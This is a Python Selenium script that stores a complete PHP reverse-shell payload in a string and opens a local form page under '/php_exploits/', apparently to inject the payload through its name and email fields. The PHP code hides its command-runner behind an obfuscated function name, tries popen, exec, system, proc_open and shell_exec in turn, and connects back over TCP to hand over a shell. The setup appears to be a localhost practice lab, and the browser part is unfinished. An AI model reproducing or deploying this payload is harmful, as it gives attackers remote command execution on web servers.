
  
# import webdriver
from selenium import webdriver

shell = """@error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='127.0.0.1';
    $port=1234;

    if(!function_exists('SqMVUlhCqNBNyr')){
      function SqMVUlhCqNBNyr($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $sSqaa='is_callable';
      $daQYsC='in_array';
      
      if($sSqaa('popen')and!$daQYsC('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($sSqaa('passthru')and!$daQYsC('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($sSqaa('exec')and!$daQYsC('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($sSqaa('system')and!$daQYsC('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($sSqaa('proc_open')and!$daQYsC('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($sSqaa('shell_exec')and!$daQYsC('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://127.0.0.1",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=SqMVUlhCqNBNyr(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=SqMVUlhCqNBNyr(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }"""
  
# create webdriver object
driver = webdriver.Chrome("C:\Users\BESSM ALLAH\Downloads\chromedriver_win32\chromedriver.exe")
  
# enter keyword to search
keyword = "geeksforgeeks"
  
# get geeksforgeeks.org
driver.get("http://127.0.0.1:8080/php_exploits/forma.html")
  
# get elements
element1 = driver.find_elements_by_name("name")
element2 = driver.find_elements_by_name("email")

  
# print complete elements list
print(element1)




